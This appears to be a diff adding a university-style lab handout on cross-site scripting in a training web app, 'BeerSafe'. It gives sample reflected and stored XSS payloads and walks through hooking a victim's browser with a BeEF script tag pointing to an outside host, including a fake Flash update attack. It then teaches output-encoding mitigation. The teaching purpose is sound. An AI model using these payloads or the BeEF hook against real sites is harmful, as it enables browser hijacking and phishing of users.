@@ -1,0 +1,76 @@
+Setting up the lab session
+Before you get started, load the right branch from the repository. Stash your current changes to the branch (git stash). Next, checkout the start_chapter4_xss branch from the Git repository (git checkout start_chapter4_xss). Also check for the latest updates (git pull) command.
+Exploiting cross-site scripting vulnerabilities
+To find and exploit XSS attacks, it's best to use Firefox. Chrome, IE/Edge, Safari, and Opera come with a built-in XSS defense mechanism, which will stop a few of these simple attacks.
+Finding XSS vulnerabilities in the application
+Based on what you have seen in the course, you should be able to find a couple of XSS vulnerabilities in the BeerSafe application. Use the pointers below to guide your search.
+
+Injecting alert(...) commands will become really annoying. Use console.log(...) statements instead.
+There is a reflected XSS vulnerability on the search page
+There is a stored XSS vulnerability in the tasting notes
+
+A sample payload for this attack is provided at the bottom of this section.
+Spicing things up with BeEF
+Until now, we performed some XSS attacks with fairly harmless payloads. As you already know, the attacker has the full power of JavaScript, so only your creativity is a limiting factor in what you can do with an XSS attack. You can always build your own XSS payload, but others have already done a great job. One example is BeEF, the Browser Exploitation Framework.
+The BeEF framework is already installed on the training VM. If you are running the application on your system, you can find installation instructions here: https://github.com/beefproject/beef/wiki/Installation
+To launch BeEF, open a terminal and go to the installation folder by executing cd /opt/beef. Next, launch beef by executing the following command: ./beef. The output should look like the one below.
+distrinet@distrinet-VirtualBox /opt/beef $ ./beef 
+[16:52:17][*] Bind socket [imapeudora1] listening on [0.0.0.0:2000].
+[16:52:17][*] Browser Exploitation Framework (BeEF) 0.4.7.0-alpha
+[16:52:17]    |   Twit: @beefproject
+[16:52:17]    |   Site: http://beefproject.com
+[16:52:17]    |   Blog: http://blog.beefproject.com
+[16:52:17]    |_  Wiki: https://github.com/beefproject/beef/wiki
+[16:52:17][*] Project Creator: Wade Alcorn (@WadeAlcorn)
+[16:52:17][*] BeEF is loading. Wait a few seconds...
+[16:52:21][*] 11 extensions enabled.
+[16:52:21][*] 298 modules enabled.
+[16:52:21][*] 2 network interfaces were detected.
+[16:52:21][+] running on network interface: 127.0.0.1
+[16:52:21]    |   Hook URL: http://127.0.0.1:3000/hook.js
+[16:52:21]    |_  UI URL:   http://127.0.0.1:3000/ui/panel
+[16:52:21][+] running on network interface: 10.0.2.15
+[16:52:21]    |   Hook URL: http://10.0.2.15:3000/hook.js
+[16:52:21]    |_  UI URL:   http://10.0.2.15:3000/ui/panel
+[16:52:21][!] Warning: Default username and weak password in use!
+[16:52:21]    |_  New password for this instance: f9694a4721438e99b6b06295db6674fe
+[16:52:21][*] RESTful API key: 47ce3e983fc020e0e07988421578fb010db26442
+[16:52:21][*] HTTP Proxy: http://127.0.0.1:6789
+Once BeEF is running, you can access the control panel by opening the following URL in your browser: http://beef.example.com:3000/ui/panel. This should give you the authentication form of the BeEF framework, as shown below.
+
+Login with the username mooc and password mooc to get to the control panel.
+
+You see an empty list of hooked browsers because we haven't compromised any browser yet. To do that, we have to make a connection from the victim's browser to the BeEF framework. This is as easy as making the browser load the script hosted at http://beef.example.com:3000/hook.js. Let's try it out:
+
+We will use Firefox as our victim browser (normally this would run on the victim's computer)
+Open the BeerSafe application in Firefox
+As the attacker (i.e. thor from your Chrome browser), create a tasting note that will load the BeEF script, for example like this: <script src="http://beef.example.com:3000/hook.js"></script>.
+As the victim, visit the note that contains the XSS payload.
+Everything looks normal, but if you check the list of hooked browsers in the BeEF framework, you will see that both ours and the victim's browser is now under control of BeEF.
+
+
+Now that we have hooked the victim's browser, we can control it through the BeEF interface. Select a command, and execute it in the victim's browser. A few ideas to get you started:
+
+Rickrolling the victim
+Changing the DOM of the current page
+A social engineering attack triggering a fake Flash update
+Under the hood, the BeEF hook runs within the page in the victim's browser. When the user leaves the page, the script is no longer active. As a result, the browser will be marked as offline in the BeEF interface. Of course, BeEF also offers commands to make the attack more persistent.
+Sample XSS payloads
+Reflected XSS in the search feature
+Entering the code below in the search box triggers the vulnerability
+"><script>console.log("Belgian Beers Rule")</script>
+Triggering the vulnerability through a form is not that hard, but the attack becomes more powerful if it can be sent with a GET request. Sending a request to the following URL also triggers the attack:
+http://beersafe.eu/Beers?search=%22%3E%3Cscript%3Econsole.log%28%22tadaa%22%29%3C%2Fscript%3E
+Stored XSS in the tasting notes
+Entering the code below in either the title or the body of a note triggers the vulnerability
+<script>console.log("Belgian Beers Rule")</script>
+Mitigating XSS
+To defend against XSS, we need to ensure that the browser will not see application data as HTML or JavaScript code. The proper technique to ensure this is context-sensitive output encoding. This technique will encode a piece of data for a particular context, and ensure that all potentially dangerous characters are encoded to a harmless representation.
+Since the BeerSafe application uses Servlets and JSP pages, we can use the OWASP Java Encoder library. This well-maintained and easy-to-use library offers encoding functions for all Web-related contexts, both in plain Java and in JSP pages. The library is already pre-installed, so all you need to do is enable it, and start encoding!
+A quick example to get you started: 
+<p>${e:forHtml(note.content)}</p>
+More information on how to use the library is available here: https://www.owasp.org/index.php/OWASP_Java_Encoder_Project#tab=Use_the_Java_Encoder_Project.
+Fix the XSS vulnerabilities you have exploited before. Verify that the solution works by retrying your payloads from before.
+A fully implemented solution is available in the solutions_chapter4_xss branch. Remember to pull the latest version, in case changes have been made to the code.
+Conclusion
+That concludes this lab session. As you have seen, XSS vulnerabilities are easy to make, but also easy to exploit. A tool like BeEF gives you a good idea of the potential danger of these vulnerabilities. The proper defense is context-sensitive output encoding, a technique supported by various libraries. The actual challenge in mitigating XSS is applying the defenses consistently throughout the application.
